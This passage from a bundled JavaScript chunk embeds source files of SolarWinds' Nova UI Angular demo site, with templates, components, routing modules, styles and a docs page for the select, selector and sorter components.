<div class="col">\n            <h3>Required Select</h3>\n            <nui-select\n                id="nui-demo-basic-select-required"\n                [itemsSource]="datasetBasic.items"\n                [isInErrorState]="isInErrorState()"\n                [value]="datasetBasic.selectedItem"\n                (changed)="valueChange($event)"\n            >\n            </nui-select>\n        </div>\n        <div class="col">\n            <h3>Select with separators</h3>\n            <nui-select\n                id="nui-demo-select-separators"\n                [itemsSource]="datasetSeparator.itemsInGroups"\n                [value]="datasetSeparator.selectedItem"\n                (changed)="valueChange($event)"\n            >\n            </nui-select>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Inline Select</h3>\n            <p>\n                <span\n                    >Lorem ipsum dolor sit amet, consectetur adipiscing elit,\n                    sed do eiusmod tempor.</span\n                >\n                <nui-select\n                    id="nui-demo-inline-select"\n                    [inline]="true"\n                    [itemsSource]="datasetBasic.items"\n                    placeholder="Select item"\n                >\n                </nui-select>\n                <span\n                    >Ut enim ad minim veniam, quis nostrud exercitation ullamco\n                    laboris nisi ut aliquip ex ea commodo consequat.</span\n                >\n            </p>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Filling the Parent Width</h3>\n            <nui-select\n                [value]="datasetBasic.selectedItem"\n                id="nui-demo-select-justified"\n                [justified]="true"\n                [itemsSource]="datasetBasic.items"\n            >\n            </nui-select>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Custom Template for Select</h3>\n            <ng-template #customSelectTemplate let-item="context">\n                <div class="w-100">\n                    <nui-icon [icon]="item.icon"></nui-icon>\n                    <div\n                        class="media-body"\n                        class="select-examples-custom-template"\n                    >\n                        <h2>{{ item.value }}</h2>\n                        <h5>{{ item.name }}</h5>\n                        <nui-progress\n                            [showProgress]="true"\n                            [show]="true"\n                            [percent]="item.progress"\n                        >\n                        </nui-progress>\n                    </div>\n                </div>\n            </ng-template>\n            <nui-select\n                [value]="datasetCustom.selectedItem"\n                id="nui-demo-select-with-template"\n                [justified]="true"\n                [itemsSource]="datasetCustom.items"\n                [displayValue]="datasetCustom.displayValue"\n                [customTemplate]="customSelectTemplate"\n            ></nui-select>\n        </div>\n        <div class="col">\n            <h3>Select with Reactive Forms</h3>\n            <form [formGroup]="myForm" (submit)="onSubmit()">\n                <div class="form-group">\n                    <nui-select\n                        placeholder="Select item"\n                        id="nui-demo-basic-select-reactive-form"\n                        formControlName="item"\n                        [isInErrorState]="\n                            myForm.controls[\'item\'].invalid &&\n                            myForm.controls[\'item\'].touched\n                        "\n                        [itemsSource]="datasetBasic.items"\n                        (changed)="valueChange($event)"\n                    ></nui-select>\n                    <button nui-button type="submit" class="mt-1">\n                        Submit\n                    </button>\n                </div>\n            </form>\n        </div>\n    </div>\n</div>\n'},61423:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-visual",\n    templateUrl: "./select-visual-test.component.html",\n    styleUrls: [\n        "../select-custom-template/select-custom-template.example.component.less",\n    ],\n})\nexport class SelectVisualTestComponent {\n    public isRequired = true;\n    public datasetBasic = {\n        items: [\n            "Item 1",\n            "Item 2",\n            "Item 3",\n            "Item 4",\n            "Item 5",\n            "Item 6",\n            "Item 7",\n            "Item 8",\n            "Item 9",\n            "Item 10",\n        ],\n        selectedItem: "",\n    };\n    public myForm;\n    public datasetDisabled = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n        selectedItem: "Item 1",\n    };\n\n    public datasetSeparator = {\n        itemsInGroups: [\n            {\n                header: $localize`Group 1 header`,\n                items: [\n                    $localize`Item 1`,\n                    $localize`Item 2`,\n                    $localize`Item 3`,\n                ],\n            },\n            {\n                header: $localize`Group 2 header`,\n                items: [\n                    $localize`Item 4`,\n                    $localize`Item 5`,\n                    $localize`Item 6`,\n                ],\n            },\n            {\n                header: $localize`Group 3 header`,\n                items: [\n                    $localize`Item 7`,\n                    $localize`Item 8`,\n                    $localize`Item 9`,\n                ],\n            },\n        ],\n        selectedItem: $localize`Item 1`,\n    };\n    public datasetCustom = {\n        displayValue: "value",\n        selectedItem: "",\n        items: [\n            {\n                name: "item_1",\n                value: "Bonobo",\n                icon: "severity_ok",\n                progress: 78,\n            },\n            {\n                name: "item_2",\n                value: "Zelda",\n                icon: "severity_ok",\n                progress: 66,\n            },\n            {\n                name: "item_3",\n                value: "Max",\n                icon: "severity_critical",\n                progress: 7,\n            },\n            {\n                name: "item_4",\n                value: "Apple",\n                icon: "severity_ok",\n                progress: 24,\n            },\n            {\n                name: "item_5",\n                value: "Quartz",\n                icon: "severity_warning",\n                progress: 89,\n            },\n        ],\n    };\n\n    constructor(private formBuilder: FormBuilder) {\n        this.myForm = this.formBuilder.group({\n            item: this.formBuilder.control(this.datasetBasic.selectedItem, [\n                Validators.required,\n            ]),\n        });\n    }\n\n    public onSubmit(): void {\n        if (!this.myForm.valid) {\n            // if form is invalid mark all controls as touched to trigger isInErrorState\n            Object.keys(this.myForm.controls).forEach((field) => {\n                const control = this.myForm.get(field);\n                control?.markAsTouched({ onlySelf: true });\n            });\n        }\n    }\n\n    public valueChange(changedEvent: ISelectChangedEvent<string>): void {\n        this.datasetBasic.selectedItem = changedEvent.newValue;\n    }\n\n    public isInErrorState(): boolean {\n        return this.isRequired && !this.datasetBasic.selectedItem;\n    }\n}\n'},48053:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiIconModule,\n    NuiProgressModule,\n    NuiSelectModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    SelectBasicExampleComponent,\n    SelectCustomTemplateExampleComponent,\n    SelectDisabledExampleComponent,\n    SelectDocsComponent,\n    SelectInlineExampleComponent,\n    SelectJustifiedExampleComponent,\n    SelectReactiveFormExampleComponent,\n    SelectRemoveValueExampleComponent,\n    SelectRequiredExampleComponent,\n    SelectSeparatorsExampleComponent,\n    SelectVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: SelectDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.support,\n                eolDate: new Date("2020-07-09"),\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "basic",\n        component: SelectBasicExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "select-visual-test",\n        component: SelectVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "select-reactive-form",\n        component: SelectReactiveFormExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiIconModule,\n        NuiProgressModule,\n        NuiSelectModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        SelectBasicExampleComponent,\n        SelectCustomTemplateExampleComponent,\n        SelectDisabledExampleComponent,\n        SelectDocsComponent,\n        SelectInlineExampleComponent,\n        SelectJustifiedExampleComponent,\n        SelectReactiveFormExampleComponent,\n        SelectRequiredExampleComponent,\n        SelectSeparatorsExampleComponent,\n        SelectVisualTestComponent,\n        SelectRemoveValueExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("select"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class SelectModule {}\n'},11072:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h5>selector</h5>\n<nui-selector\n    id="nui-demo-selector"\n    (selectionChange)="onSelectionChange($event)"\n    [checkboxStatus]="checkBoxStatus"\n    [appendToBody]="appendToBody"\n    [items]="availableStatuses"\n>\n</nui-selector>\n\n<a\n    href="javascript:;"\n    (click)="makeIndeterminate()"\n    id="nui-demo-make-indeterminate"\n    i18n\n    >Make indeterminate</a\n>\n<a\n    href="javascript:;"\n    (click)="makeAppendedToBody()"\n    id="nui-demo-make-appended-to-body"\n    i18n\n    >Make appended to body</a\n>\n<pre>[Selection: <span id="nui-demo-selection-type">{{selection}}</span>, checkbox status: <span id="nui-demo-indeterminate">{{checkBoxStatus}}</span>]</pre>\n'},39232:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { CheckboxStatus, IMenuGroup, SelectionType } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-selector-example",\n    templateUrl: "./selector.example.component.html",\n})\nexport class SelectorExampleComponent {\n    public selection: SelectionType = SelectionType.None;\n    public availableStatuses: IMenuGroup[] = this.getMenuItems([\n        SelectionType.All,\n        SelectionType.AllPages,\n        SelectionType.None,\n    ]);\n    public checkBoxStatus: CheckboxStatus = CheckboxStatus.Unchecked;\n    public appendToBody = false;\n\n    public onSelectionChange(event: SelectionType): void {\n        this.selection = event;\n\n        switch (this.selection) {\n            case SelectionType.All:\n                this.checkBoxStatus = CheckboxStatus.Checked;\n                this.availableStatuses = this.getMenuItems([\n                    SelectionType.AllPages,\n                    SelectionType.None,\n                ]);\n                break;\n            case SelectionType.AllPages:\n                this.checkBoxStatus = CheckboxStatus.Checked;\n                this.availableStatuses = this.getMenuItems([\n                    SelectionType.All,\n                    SelectionType.None,\n                ]);\n                break;\n            case SelectionType.None:\n            case SelectionType.UnselectAll:\n                this.checkBoxStatus = CheckboxStatus.Unchecked;\n                this.availableStatuses = this.getMenuItems([\n                    SelectionType.All,\n                    SelectionType.AllPages,\n                ]);\n                break;\n        }\n    }\n\n    public makeIndeterminate(): void {\n        this.checkBoxStatus = CheckboxStatus.Indeterminate;\n        this.selection = SelectionType.None;\n    }\n\n    public makeAppendedToBody(): void {\n        this.appendToBody = true;\n    }\n\n    public getMenuItems(arr: SelectionType[]): IMenuGroup[] {\n        const resultArr: IMenuGroup[] = [\n            {\n                itemsSource: [],\n            },\n        ];\n        arr.map((element: SelectionType) => {\n            resultArr[0].itemsSource.push({ value: element, title: element });\n        });\n        return resultArr;\n    }\n}\n'},58387:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDocsModule,\n    NuiSelectorModule,\n} from "@nova-ui/bits";\n\nimport { SelectorExampleComponent } from "./selector.example.component";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: SelectorExampleComponent,\n    },\n];\n\n@NgModule({\n    imports: [NuiSelectorModule, NuiDocsModule, RouterModule.forChild(routes)],\n    declarations: [SelectorExampleComponent],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("selector"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class SelectorModule {}\n'},61668:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sorter\n    id="nui-demo-sorter"\n    i18n-caption\n    caption="Sorter Caption"\n    [itemsSource]="columns"\n    [selectedItem]="sortBy"\n    [sortDirection]="initialSortDirection"\n    (sorterAction)="onSorterAction($event)"\n>\n</nui-sorter>\n<nui-repeat [itemsSource]="items" [repeatItemTemplateRef]="repeatItemTemplate">\n    <div repeatHeaderTemplate>\n        <div class="sorter-flex-header">\n            <div class="sorter-flex-row">\n                <div\n                    class="sorter-flex-item header-item"\n                    *ngFor="let col of columns"\n                >\n                    {{ col.title }}\n                </div>\n            </div>\n        </div>\n    </div>\n</nui-repeat>\n<ng-template #repeatItemTemplate let-item="item">\n    <div class="sorter-flex-row">\n        <div class="sorter-flex-item">{{ item.title }}</div>\n        <div class="sorter-flex-item">{{ item.year }}</div>\n        <div class="sorter-flex-item">{{ item.director }}</div>\n    </div>\n</ng-template>\n'},21572:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="@col-width: 180px;\n\n.sorter-flex-row {\n    display: flex;\n    flex-grow: 0;\n    flex-direction: row;\n    flex-wrap: wrap;\n    width: 100%;\n    padding: 0px 10px;\n}\n.sorter-flex-header {\n    padding-left: 3px;\n    margin-left: 5px;\n    margin-right: 10px;\n}\n.header-item {\n    font-weight: bold;\n    margin-top: 10px;\n}\n.sorter-flex-item {\n    padding: 5px;\n    flex-grow: 1;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    padding-right: 10px;\n    width: @col-width;\n}\n"},63255:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\n// eslint-disable-next-line no-restricted-imports\nimport { orderBy } from "lodash";\n\nimport { IMenuItem, ISorterChanges, SorterDirection } from "@nova-ui/bits";\n\ninterface IFilm {\n    title: string;\n    year: string;\n    director: string;\n}\n\n@Component({\n    selector: "nui-sorter-basic-example",\n    templateUrl: "./sorter-basic.example.component.html",\n    styleUrls: ["./sorter-basic.example.component.less"],\n})\nexport class SorterBasicExampleComponent implements OnInit {\n    public readonly columns: IMenuItem[] = [\n        {\n            title: $localize`Title`,\n            value: "title",\n        },\n        {\n            title: $localize`Year`,\n            value: "year",\n        },\n        {\n            title: $localize`Director`,\n            value: "director",\n        },\n    ];\n\n    public readonly initialSortDirection = SorterDirection.ascending;\n    public sortBy = this.columns[1].value;\n    public items: IFilm[] = getData();\n\n    public ngOnInit(): void {\n        this.sortItems(this.sortBy, this.initialSortDirection);\n    }\n\n    public onSorterAction(changeEvent: ISorterChanges): void {\n        this.sortBy = changeEvent.newValue.sortBy;\n        this.sortItems(\n            changeEvent.newValue.sortBy,\n            changeEvent.newValue.direction\n        );\n    }\n\n    private sortItems(sortBy: string, direction: SorterDirection) {\n        this.items = orderBy(\n            this.items,\n            [sortBy],\n            [\n                direction as\n                    | SorterDirection.ascending\n                    | SorterDirection.descending,\n            ]\n        ) as IFilm[];\n    }\n}\n\nfunction getData(): IFilm[] {\n    return [\n        { title: "Vertigo", year: "1958", director: "Alfred Hitchcock" },\n        { title: "Citizen Kane", year: "1941", director: "Orson Welles" },\n        {\n            title: "2001: A Space Odyssey",\n            year: "1968",\n            director: "Stanley Kubrick",\n        },\n        {\n            title: "The Godfather",\n            year: "1972",\n            director: "Francis Ford Coppola",\n        },\n        { title: "Mulholland Dr.", year: "2001", director: "David Lynch" },\n        { title: "Taxi Driver", year: "1976", director: "Martin Scorsese" },\n        { title: "La Dolce Vita", year: "1960", director: "Federico Fellini" },\n        {\n            title: "The Silence of the Lambs",\n            year: "1991",\n            director: "Jonathan Demme",\n        },\n        { title: "The Terminator", year: "1984", director: "James Cameron" },\n    ];\n}\n'},59334:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The <code>nui-sorter</code> component provides a toggle mechanism for\n    sorting a set of items in ascending or descending order. The value to sort\n    by can be selected by the user via a dropdown.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiSorterModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<h3>Inputs</h3>\n<p>\n    <code>{{ getSorterPropKey("itemsSource") }}</code> - To get the sorter\n    working, provide an array of type\n    <code\n        ><a href="../interfaces/IMenuItem.html" target="_blank"\n            >IMenuItem[]</a\n        ></code\n    >\n    to the <code>{{ getSorterPropKey("itemsSource") }}</code> input. Each item\n    in the array should be set with a\n    <code>{{ getIMenuItemInterfaceKey("title") }}</code> and\n    <code>{{ getIMenuItemInterfaceKey("value") }}</code> for populating the\n    sorter dropdown. The title property is for display and can be localized. The\n    value property is what\'s actually used for sorting.\n</p>\n<p>\n    <code>{{ getSorterPropKey("selectedItem") }}</code> - To specify an initial\n    value to sort by, optionally set the\n    <code>{{ getSorterPropKey("selectedItem") }}</code> input with an item\'s\n    <code>{{ getIMenuItemInterfaceKey("value") }}</code> from the\n    <code>{{ getSorterPropKey("itemsSource") }}</code> array. By default, the\n    initial sort-by value is the\n    <code>{{ getIMenuItemInterfaceKey("value") }}</code> of the first item in\n    the\n    <code>{{ getSorterPropKey("itemsSource") }}</code>\n</p>\n<p>\n    <code>{{ getSorterPropKey("sortDirection") }}</code> - To specify an initial\n    sorting direction, optionally set the\n    <code>{{ getSorterPropKey("sortDirection") }}</code> input with a value of\n    type\n    <code\n        ><a\n            href="../miscellaneous/enumerations.html#SorterDirection"\n            target="_blank"\n            >SorterDirection</a\n        ></code\n    >. By default, the initial sorting direction is\n    <code>SorterDirection.ascending</code>.\n</p>\n<p>\n    <code>{{ getSorterPropKey("caption") }}</code> - To specify a caption,\n    optionally set the <code>{{ getSorterPropKey("caption") }}</code> input with\n    a string value.\n</p>\n\n<h3>Sorter Action Output</h3>\n<p>\n    The sorter responds to user interaction by emitting a\n    <code>{{ getSorterPropKey("sorterAction") }}</code> output with an\n    <code\n        ><a href="../interfaces/ISorterChanges.html" target="_blank"\n            >ISorterChanges</a\n        ></code\n    >\n    payload. The\n    <code>{{ getISorterChangesInterfaceKey("oldValue") }}</code> and\n    <code>{{ getISorterChangesInterfaceKey("newValue") }}</code> in the payload\n    are each of type\n    <code\n        ><a href="../interfaces/ISortedItem.html" target="_blank"\n            >ISortedItem</a\n        ></code\n    >. User actions that trigger the output include changing the sorting\n    direction and selecting a new item to sort by. Bind to this output to set a\n    new value for the <code>{{ getSorterPropKey("selectedItem") }}</code> input\n    and to sort your items according to the payload\'s\n    <code\n        >{{ getISorterChangesInterfaceKey("newValue") }}.{{\n            getISortedItemInterfaceKey("sortBy")\n        }}</code\n    >\n    value.\n</p>\n\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> The sorter component does not emit an initial\n    sorterAction output. As a result, be sure to perform an initial sorting of\n    your items in your component\'s <code>ngOnInit</code>. Thereafter,\n    user-initiated sorting can be handled via your sorterAction output handler.\n</nui-message>\n\n<nui-example-wrapper filenamePrefix="sorter-basic" exampleTitle="Simple Sorter">\n    <nui-sorter-basic-example></nui-sorter-basic-example>\n</nui-example-wrapper>\n'},90258:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport {\n    IMenuItem,\n    ISortedItem,\n    ISorterChanges,\n    SorterComponent,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-sorter-docs-example",\n    templateUrl: "./sorter-docs.example.component.html",\n})\nexport class SorterExampleComponent {\n    getSorterPropKey(key: keyof SorterComponent): string {\n        return key;\n    }\n\n    getISorterChangesInterfaceKey(key: keyof ISorterChanges): string {\n        return key;\n    }\n\n    getISortedItemInterfaceKey(key: keyof ISortedItem): string {\n        return key;\n    }\n\n    getIMenuItemInterfaceKey(key: keyof IMenuItem): string {\n        return key;\n    }\n}\n'},2666:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sorter\n    id="nui-demo-sorter"\n    i18n-caption\n    caption="Sorter Caption"\n    [itemsSource]="columns"\n    [selectedItem]="sortBy"\n    [sortDirection]="sortDirection"\n    (sorterAction)="onSorterAction($event)"\n>\n</nui-sorter>\n<button (click)="resetSorter()">reset sorter</button>\n<button (click)="updateSorterByProperty()">update sorter by property</button>\n<button (click)="updateSorterByMethod()">update sorter by method</button>\n<button (click)="updateSorterDirection()">update sorter direction</button>\n\n<nui-repeat [itemsSource]="items" [repeatItemTemplateRef]="repeatItemTemplate">\n    <div repeatHeaderTemplate>\n        <div class="sorter-flex-header">\n            <div class="sorter-flex-row">\n                <div\n                    class="sorter-flex-item header-item"\n                    *ngFor="let col of columns"\n                >\n                    {{ col.title }}\n                </div>\n            </div>\n        </div>\n    </div>\n</nui-repeat>\n<ng-template #repeatItemTemplate let-item="item">\n    <div class="sorter-flex-row">\n        <div class="sorter-flex-item">{{ item.title }}</div>\n        <div class="sorter-flex-item">{{ item.year }}</div>\n        <div class="sorter-flex-item">{{ item.director }}</div>\n    </div>\n</ng-template>\n'},1570:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="@col-width: 180px;\n\n.sorter-flex-row {\n    display: flex;\n    flex-grow: 0;\n    flex-direction: row;\n    flex-wrap: wrap;\n    width: 100%;\n    padding: 0px 10px;\n}\n.sorter-flex-header {\n    padding-left: 3px;\n    margin-left: 5px;\n    margin-right: 10px;\n}\n.header-item {\n    font-weight: bold;\n    margin-top: 10px;\n}\n.sorter-flex-item {\n    padding: 5px;\n    flex-grow: 1;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    padding-right: 10px;\n    width: @col-width;\n}\n"},65238:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit, ViewChild } from "@angular/core";\nimport _orderBy from "lodash/orderBy";\nimport { BehaviorSubject } from "rxjs";\n\nimport {\n    IMenuItem,\n    ISorterChanges,\n    SorterComponent,\n    SorterDirection,\n} from "@nova-ui/bits";\n\ninterface IFilm {\n    title: string;\n    year: string;\n    director: string;\n}\n\n@Component({\n    selector: "nui-sorter-test-example",\n    templateUrl: "./sorter-test.example.component.html",\n    styleUrls: ["./sorter-test.example.component.less"],\n})\nexport class SorterTestExampleComponent implements OnInit {\n    private readonly emptyColumns: IMenuItem[] = [\n        {\n            title: $localize`Empty`,\n            value: "",\n        },\n    ];\n    public readonly dataColumns: IMenuItem[] = [\n        {\n            title: $localize`Title`,\n            value: "title",\n        },\n        {\n            title: $localize`Year`,\n            value: "year",\n        },\n        {\n            title: $localize`Director`,\n            value: "director",\n        },\n    ];\n\n    public columns: IMenuItem[] 